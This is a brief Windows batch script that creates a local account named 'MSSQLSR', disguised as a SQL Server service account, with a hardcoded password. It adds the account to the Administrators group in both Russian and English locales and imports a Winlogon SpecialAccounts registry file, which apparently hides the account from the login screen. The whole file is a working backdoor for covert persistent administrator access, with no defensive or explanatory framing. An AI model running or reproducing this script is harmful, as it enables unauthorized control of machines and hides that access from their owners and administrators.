echo off
chcp 1251
net user MSSQLSR Admin01234 /add
net localgroup Администраторы MSSQLSR /add
net localgroup Administrators MSSQLSR /add
reg_import_file.bat winlogon-SpecialAccounts.reg
chcp 866